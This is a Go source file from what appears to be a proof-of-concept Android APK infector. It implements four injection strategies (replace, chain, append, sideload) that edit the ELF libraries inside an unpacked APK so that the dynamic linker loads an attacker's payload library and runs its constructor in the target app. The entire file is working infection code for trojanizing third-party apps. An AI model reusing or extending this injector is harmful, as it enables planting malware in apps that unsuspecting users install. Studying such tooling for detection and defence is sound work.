// Package nativepatch applies the native-layer injection vector: it makes the
// dynamic linker load the Archinome payload library in the target process.
//
// Three strategies are supported, all of them length-preserving edits of the
// ELF images already present in the APK:
//
//	replace - the host library is renamed and the payload takes its place, so
//	          the payload is loaded by whatever opens the host by name;
//	chain   - one DT_NEEDED entry of the host is re-pointed at the payload,
//	          and the payload carries the displaced dependency itself;
//	append  - a new DT_NEEDED entry is added, leaving the existing graph
//	          untouched (needs unused space in the dynamic and string tables).
//	sideload - no host library is touched at all: the payload is dropped in as a
//	          name the host asks for with System.loadLibrary() but never ships,
//	          so the app's own (failing) lookup resolves to the payload and the
//	          dynamic linker runs its constructor. Nothing in the manifest or in
//	          the dex changes -- the learned name is the whole vector.
package nativepatch

import (
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strings"

	"github.com/thatskriptkid/apk-infector-Archinome-PoC/pkg/elfpatch"
)

// Placeholder is the dependency name baked into the payload at build time. The
// injector rewrites it, which is what keeps a single prebuilt payload usable
// for every host library.
const Placeholder = "libarchinome_dependency_slot.so"

// Mode selects the injection strategy.
type Mode string

const (
	ModeChain    Mode = "chain"
	ModeReplace  Mode = "replace"
	ModeAppend   Mode = "append"
	ModeSideload Mode = "sideload"
)

// Options configures Apply.
type Options struct {
	ABI     string // e.g. arm64-v8a; empty means every ABI that has a payload
	HostLib string // e.g. libsuperpack.so; empty picks the largest library
	Mode    Mode   // empty defaults to chain
	Payload string // payload .so; empty defaults to the build output for the ABI
	OurName string // name of the payload inside the APK; defaults to its base name
}

// Result reports what was done for one ABI.
type Result struct {
	ABI         string
	Mode        Mode
	HostLib     string
	Displaced   string // dependency the host used to point at
	RenamedTo   string // set in replace mode
	PayloadName string
	Bytes       int
}

func (r Result) String() string {
	switch r.Mode {
	case ModeReplace:
		return fmt.Sprintf("%s: %s -> %s (payload installed as %s, original renamed %s)",
			r.ABI, r.HostLib, r.PayloadName, r.HostLib, r.RenamedTo)
	case ModeChain:
		return fmt.Sprintf("%s: %s now requires %s (displaced %s)",
			r.ABI, r.HostLib, r.PayloadName, r.Displaced)
	case ModeSideload:
		// There is no host library: the point of the mode is that the name the
		// app asks for is missing from the APK, so the app's own lookup is what
		// loads the payload.
		return fmt.Sprintf("%s: added %s (a library the app loads by name but does not ship; "+
			"placeholder dependency re-pointed at %s)", r.ABI, r.PayloadName, r.Displaced)
	default:
		return fmt.Sprintf("%s: %s now also requires %s", r.ABI, r.HostLib, r.PayloadName)
	}
}

// Apply injects the payload into every (or the requested) ABI directory below
// rootDir, which is the unpacked APK.
func Apply(rootDir string, opt Options) ([]Result, error) {
	if opt.Mode == "" {
		opt.Mode = ModeChain
	}
	if opt.Mode != ModeChain && opt.Mode != ModeReplace && opt.Mode != ModeAppend && opt.Mode != ModeSideload {
		return nil, fmt.Errorf("unknown native mode %q (want chain, replace, append or sideload)", opt.Mode)
	}
	abis, err := abiDirs(rootDir, opt.ABI)
	if err != nil {
		return nil, err
	}
	var results []Result
	var skipped []string
	for _, abi := range abis {
		libDir := filepath.Join(rootDir, "lib", abi)
		payload := opt.Payload
		if payload == "" {
			payload = filepath.Join("native_payload", "out", abi, "libarchin.so")
		}
		if _, err := os.Stat(payload); err != nil {
			skipped = append(skipped, abi)
			continue
		}
		var res *Result
		if opt.Mode == ModeSideload {
			res, err = applySideload(libDir, abi, payload, opt)
		} else {
			res, err = applyABI(libDir, abi, payload, opt)
		}
		if err != nil {
			return results, fmt.Errorf("%s: %w", abi, err)
		}
		results = append(results, *res)
	}
	if len(results) == 0 {
		if len(skipped) > 0 {
			return nil, fmt.Errorf("no payload library available for %s", strings.Join(skipped, ", "))
		}
		return nil, fmt.Errorf("no native libraries found below %s", rootDir)
	}
	return results, nil
}

// applySideload drops the payload in under a name the host resolves itself. The
// existing library graph is not touched at all -- the whole vector is the name
// the app asks for and never finds.
func applySideload(libDir, abi, payloadPath string, opt Options) (*Result, error) {
	name := filepath.Base(opt.OurName)
	if name == "" || name == "." {
		return nil, fmt.Errorf("sideload mode needs OurName: the library name the host asks for")
	}
	if !strings.HasSuffix(name, ".so") {
		return nil, fmt.Errorf("sideload name %q is not a .so name", name)
	}
	dst := filepath.Join(libDir, name)
	if _, err := os.Stat(dst); err == nil {
		// A candidate stops being a candidate the moment the host ships it:
		// the payload would lose to the library the app already has.
		return nil, fmt.Errorf("%s already ships in the APK; that name cannot be sideloaded", name)
	}
	// Nothing displaces a dependency for the payload in this mode, so its
	// build-time placeholder has to point at a library that is loaded anyway.
	target := "libc.so"
	if err := writePayload(payloadPath, dst, target); err != nil {
		return nil, err
	}
	res := &Result{ABI: abi, Mode: ModeSideload, PayloadName: name, Displaced: target}
	if st, err := os.Stat(dst); err == nil {
		res.Bytes = int(st.Size())
	}
	return res, nil
}

func applyABI(libDir, abi, payloadPath string, opt Options) (*Result, error) {
	host, err := pickHost(libDir, opt.HostLib)
	if err != nil {
		return nil, err
	}
	ourName := opt.OurName
	if ourName == "" {
		ourName = filepath.Base(payloadPath)
	}
	if host == ourName {
		return nil, fmt.Errorf("%s is the payload itself; choose another host library", host)
	}
	hostPath := filepath.Join(libDir, host)

	res := &Result{ABI: abi, Mode: opt.Mode, HostLib: host, PayloadName: ourName}

	switch opt.Mode {
	case ModeReplace:
		renamed := strings.TrimSuffix(host, ".so") + "_orig.so"
		if _, err := os.Stat(filepath.Join(libDir, renamed)); err == nil {
			return nil, fmt.Errorf("%s already exists", renamed)
		}
		// Rename first: the replacement must take over the host's own file name,
		// otherwise System.loadLibrary() would not find it.
		if err := os.Rename(hostPath, filepath.Join(libDir, renamed)); err != nil {
			return nil, err
		}
		if err := writePayload(payloadPath, hostPath, renamed); err != nil {
			return nil, err
		}
		res.PayloadName = host
		res.RenamedTo = renamed
		res.Displaced = renamed

	case ModeChain:
		host, err := elfpatch.Open(hostPath)
		if err != nil {
			return nil, err
		}
		entry := host.PickNeeded(len(ourName))
		if entry == nil {
			best := 0
			for _, n := range host.Needed {
				if n.Capacity > best {
					best = n.Capacity
				}
			}
			return nil, fmt.Errorf("%s has no DT_NEEDED slot able to hold %q "+
				"(longest dependency name is %d bytes); use --mode append or replace",
				res.HostLib, ourName, best)
		}
		res.Displaced = entry.Name
		if err := host.RewriteNeeded(entry, ourName); err != nil {
			return nil, err
		}
		if err := host.Save(hostPath); err != nil {
			return nil, err
		}
		// The displaced dependency has to stay in the graph, one hop further out.
		if err := writePayload(payloadPath, filepath.Join(libDir, ourName), res.Displaced); err != nil {
			return nil, err
		}

	case ModeAppend:
		host, err := elfpatch.Open(hostPath)
		if err != nil {
			return nil, err
		}
		if err := host.AddNeeded(ourName); err != nil {
			return nil, err
		}
		if err := host.Save(hostPath); err != nil {
			return nil, err
		}
		// Nothing was displaced, so the payload just has to point its placeholder
		// at a library that is guaranteed to be loaded anyway.
		target := "libc.so"
		if e := host.NeededEntry("libc.so"); e == nil && len(host.Needed) > 0 {
			target = host.Needed[0].Name
		}
		res.Displaced = target
		if err := writePayload(payloadPath, filepath.Join(libDir, ourName), target); err != nil {
			return nil, err
		}
	}

	st, err := os.Stat(filepath.Join(libDir, res.PayloadName))
	if err == nil {
		res.Bytes = int(st.Size())
	}
	return res, nil
}

// writePayload copies the payload library, re-pointing its placeholder
// dependency at dep, which must not be longer than the placeholder.
func writePayload(src, dst, dep string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	n, err := elfpatch.ReplaceBytes(data, Placeholder, dep)
	if err != nil {
		return fmt.Errorf("%s: %w", filepath.Base(src), err)
	}
	if n < 2 {
		return fmt.Errorf("%s: expected the placeholder in both the string table and "+
			"the forwarding constant, found %d occurrence(s)", filepath.Base(src), n)
	}
	return os.WriteFile(dst, data, 0644)
}

func abiDirs(rootDir, want string) ([]string, error) {
	base := filepath.Join(rootDir, "lib")
	entries, err := os.ReadDir(base)
	if err != nil {
		if os.IsNotExist(err) {
			return nil, fmt.Errorf("the APK has no lib/ directory, so there is nothing to patch")
		}
		return nil, err
	}
	var abis []string
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		if want != "" && e.Name() != want {
			continue
		}
		abis = append(abis, e.Name())
	}
	if want != "" && len(abis) == 0 {
		return nil, fmt.Errorf("no lib/%s directory in the APK", want)
	}
	sort.Strings(abis)
	return abis, nil
}

// pickHost returns the library that will carry the injection. Without an
// explicit choice the largest library is used: on real applications that is the
// one the process loads first.
func pickHost(libDir, want string) (string, error) {
	entries, err := os.ReadDir(libDir)
	if err != nil {
		return "", err
	}
	type cand struct {
		name string
		size int64
	}
	var cands []cand
	for _, e := range entries {
		if e.IsDir() || !strings.HasSuffix(e.Name(), ".so") {
			continue
		}
		info, err := e.Info()
		if err != nil {
			continue
		}
		cands = append(cands, cand{e.Name(), info.Size()})
	}
	if len(cands) == 0 {
		return "", fmt.Errorf("no shared libraries in %s", libDir)
	}
	sort.Slice(cands, func(i, j int) bool { return cands[i].size > cands[j].size })
	if want == "" {
		return cands[0].name, nil
	}
	for _, c := range cands {
		if c.name == want {
			return c.name, nil
		}
	}
	return "", fmt.Errorf("%s is not in %s", want, libDir)
}
